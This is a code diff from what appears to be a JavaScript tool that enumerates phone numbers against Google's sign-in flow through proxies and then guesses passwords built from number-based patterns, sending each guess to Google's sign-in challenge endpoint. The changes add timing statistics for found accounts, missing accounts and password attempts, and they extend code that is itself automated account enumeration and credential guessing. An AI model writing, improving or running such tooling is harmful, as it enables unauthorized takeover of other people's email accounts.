@@ -23,6 +23,7 @@ let mWorkerAbort = {}
 let mRequestCount = {}
 let mConfig = null
 let mStatus = null
+let mPerfromance = null
 let mNumbers = []
 let mStart = Date.now()
 
@@ -69,7 +70,19 @@ async function startPrecoss() {
                     pass:0,
                     login:0,
                     ins:0,
+                    foundPrfm:0,
+                    notFoundPrfm:0,
+                    passwordPrfm:0,
                     other:0
+                }
+
+                mPerfromance = {
+                    found:0,
+                    foundTime:0,
+                    notFound:0,
+                    notFoundTime:0,
+                    password:0,
+                    passwordTime:0
                 }
 
                 for (let i = 0; i < mConfig.tab; i++) {
@@ -80,6 +93,10 @@ async function startPrecoss() {
                 await waitForCompleted(mConfig.tab, mNumbers.length*(mConfig.pass.length+2)*4000)
                 mNumbers = []
 
+                mStatus.foundPrfm = parseInt(mPerfromance.foundTime/mPerfromance.found)
+                mStatus.notFoundPrfm = parseInt(mPerfromance.notFoundTime/mPerfromance.notFound)
+                mStatus.passwordPrfm = parseInt(mPerfromance.passwordTime/mPerfromance.password)
+                
                 process.send({ t: 5, s: 'gmail_collect_status', c:USER, d: { type:1, server:USER, status:mStatus } })
             } catch (error) {}
 
@@ -183,8 +200,17 @@ async function startWork(load) {
             let number = mNumbers.shift()
             if (!number) continue
             
+            let start = Date.now()
             let data = await getLoginStatus(mPage[load], load, '+'+number, mConfig.always?'proxy':'manually')
             
+            if (data.status == 1) {
+                mPerfromance.found++
+                mPerfromance.foundTime += Date.now()-start
+            } else if (data.status == 4) {
+                mPerfromance.notFound++
+                mPerfromance.notFoundTime += Date.now()-start
+            }
+
             if (data.status == 0 || data.status == 5 || data.status == 1) {
                 let mainErr = false
                 if(data.status == 0) {
@@ -213,6 +239,8 @@ async function startWork(load) {
                 mStatus.found++
                 let patern = mConfig.pass
                 let length = number.toString().length
+                let passCount = 0
+                let passTime = 0
 
                 for (let i = 0; i < patern.length; i++) {
                     try {
@@ -230,8 +258,13 @@ async function startWork(load) {
                         }
 
                         let password = patern[i].replace('['+orgPass+']', pass)
+                        
+                        start = Date.now()
 
                         let passData = await getPasswordMatch(mPage[load], password, data.tl, data.cid, data.headers, load)
+
+                        passCount++
+                        passTime += Date.now()-start
 
                         if (passData.status == 200) {
                             mStatus.pass++
@@ -252,6 +285,9 @@ async function startWork(load) {
                         }
                     } catch (error) {}
                 }
+
+                mPerfromance.password++
+                mPerfromance.passwordTime += parseInt(passTime/passCount)
             } else if (data.status == 2) {
                 mStatus.recaptcha++
             } else if (data.status == 3) {
@@ -423,7 +459,8 @@ async function getPasswordMatch(page, password, tl, cid, headers, load) {
             headers['x-same-domain'] = '1'
             
             let response = await proxyRequest(page, 'https://accounts.google.com/_/signin/challenge?hl=en&TL=' + tl, headers, body, mConfig.proxy, load)
-            
+            mRequestCount[load]++
+
             if (response && response.body) {
                 let data = response.body.toString()
 
